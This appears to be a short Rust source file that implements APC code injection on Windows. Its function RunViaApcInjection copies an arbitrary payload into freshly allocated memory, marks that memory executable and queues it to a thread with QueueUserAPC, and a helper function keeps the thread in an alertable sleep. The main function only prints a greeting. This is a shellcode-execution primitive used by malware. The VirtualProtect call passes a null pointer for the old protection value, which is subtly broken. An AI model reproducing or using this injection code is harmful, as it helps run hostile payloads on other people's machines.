use std::u32;

use winapi::shared::ntdef::{HANDLE, NULL};
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
use winapi::um::processthreadsapi::QueueUserAPC;
use winapi::um::winnt::PAPCFUNC;
use winapi::um::synchapi::Sleep;

fn main() {
    println!("Hello, world!");
}

fn RunViaApcInjection(
    h_thread: HANDLE,
    payload: &[u8]
) -> bool {
    unsafe {
        let mut p_address = VirtualAlloc(NULL, payload.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if p_address.is_null() {
            eprintln!("{:?}", std::io::Error::last_os_error());
            return false;
        }

        std::ptr::copy_nonoverlapping(payload.as_ptr(), p_address as *mut u8, payload.len());

        if (VirtualProtect(p_address, payload.len(), PAGE_EXECUTE_READWRITE, std::ptr::null_mut())) == 0 {
            eprintln!("{:?}", std::io::Error::last_os_error());
            return false;
        }
        
        if QueueUserAPC(
            std::mem::transmute(p_address),
            h_thread,
            0
        ) == 0 {
            eprintln!("{:?}", std::io::Error::last_os_error());
            return false;
        }
        true 
    }
}

fn AlertableFunction() {
    unsafe {
        Sleep(u32::MAX);
    }
}